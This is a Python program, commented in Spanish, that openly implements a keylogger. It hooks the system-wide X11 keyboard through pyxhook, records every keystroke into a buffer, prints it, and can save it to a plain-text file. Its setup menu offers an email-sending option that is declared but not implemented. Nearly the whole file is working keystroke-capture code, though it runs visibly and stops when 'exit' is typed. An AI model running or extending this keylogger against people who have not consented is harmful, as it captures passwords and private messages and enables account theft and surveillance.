import pyxhook
import time
import sys
import termios
from datetime import datetime

class Keyloggerore:
    def __init__(self, enviar_correo=False, guardar_local=False):
        self.buffer = "" # Registro de pulsaciones
        self.running = True
        self.enviar_correo = enviar_correo
        self.guardar_local = guardar_local
        self.archivo_output = "output.txt" 

    ### Funcion (MODIFICADA) de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
    # This function is called every time a key is presssed
    def callback(self, event):
        if hasattr(event, 'Key'): # se toma event.Key (los otros son: event.KeyID, event.Ascii)
            self.buffer += event.Key
            
        # print key info
        print(" => Evento: " + event.Key) # ELIMINAR DESPUES
        print("BUFFER: \n" + self.buffer + "\n")

        # If the "string" value matches spacebar, terminate the while loop
        if "exit" in self.buffer.lower():
            print("\n[x] Se detecto 'exit'. Finalizando keylogger.")
            termios.tcflush(sys.stdin, termios.TCIFLUSH) # Limpiar terminal
            
            # PRIMERO se guarda el archivo con el buffer completo
            if self.guardar_local:
                self.guardar_archivo_local()
            
            # DESPUÉS se limpia y detener
            self.running = False
            
    def guardar_archivo_local(self):
        try:
            contenido = "============= REGISTRO DE KEYLOGGER =============\n"
            contenido += f"Fecha de generación: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            contenido +="=================================================\n"
            contenido += "Eventos registrados:\n"
            contenido += self.buffer
            contenido +="\n=================================================\n"
            contenido += "FIN DEL REGISTRO\n"
            
            with open(self.archivo_output, 'w', encoding='utf-8') as archivo:
                archivo.write(contenido)
                
            print(f"Registros guardados exitosamente en: {self.archivo_output}")
            print(f"Archivo creado con {len(self.buffer)} caracteres registrados")
            
        except Exception as e:
            print(f"Error al guardar el archivo local: {e}")
                    
def mostrar_menu():    
    print("============= Configuracion del keylogger. =============")
    print("Instrucciones: Responde 'yes'/'y' para SI, 'no'/'n' para NO, o 'exit' para salir")
    print()
        
    while True:
        print("¿Deseas enviar los registros por email?")
        opcion_correo = input("Respuesta: ").strip().lower()
        if opcion_correo == 'exit':
            print("\n[x] Saliendo del programa.")
            sys.exit(0)
        elif opcion_correo in ['yes', 'y']:
            enviar_correo = True
            print("Envío por email: ACTIVADO")
            break
        elif opcion_correo in ['no', 'n']:
            enviar_correo = False
            print("Envío por email: DESACTIVADO")
            break
        else:
            print("Respuesta inválida. Por favor ingresa: yes, y, no, n, o exit\n")
        
    print()
        
    while True:
        print("¿Deseas guardar los registros en texto plano?")
        opcion_texto = input("Respuesta: ").strip().lower()
        
        if opcion_texto == 'exit':
            print("\n[x] Saliendo del programa.")
            sys.exit(0)
        elif opcion_texto in ['yes', 'y']:
            guardar_texto_plano = True
            print("Guardado en texto plano: ACTIVADO")
            break
        elif opcion_texto in ['no', 'n']:
            guardar_texto_plano = False
            print("Guardado en texto plano: DESACTIVADO")
            break
        else:
            print("Respuesta inválida. Por favor ingresa: yes, y, no, n, o exit\n")
        
    print()
        
    return enviar_correo, guardar_texto_plano
        
if __name__ == "__main__":

    enviar_correo, guardar_local = mostrar_menu()
    
    print("============= Keylogger iniciado. =============")
    print("INSTRUCCIONES: Escribe 'exit' para terminar el programa")
    print()
    
    logger = Keyloggerore(enviar_correo=enviar_correo, guardar_local=guardar_local)
    
    try:
        ### codigo tomado de https://github.com/JeffHoogland/pyxhook/blob/master/example.py
        # Create hookmanager
        hookman = pyxhook.HookManager()
        # Define our callback to fire when a key is pressed down
        hookman.KeyDown = logger.callback
        # Hook the keyboard
        hookman.HookKeyboard()
        # Start our listener
        hookman.start()

        # Create a loop to keep the application running
        while logger.running:
            time.sleep(0.1)
            
    except KeyboardInterrupt:
        print("\n[x] Programa interrumpido por Ctrl+C.")

    if guardar_local and logger.buffer and logger.running == False:
        # solo si no se guardo ya en el callback
        if "exit" not in logger.buffer.lower():
            print("Guardando registros finales.")
            logger.guardar_archivo_local()

    # Close the listener when we are done
    hookman.cancel()
    
    print("============= Keylogger detenido. =============")
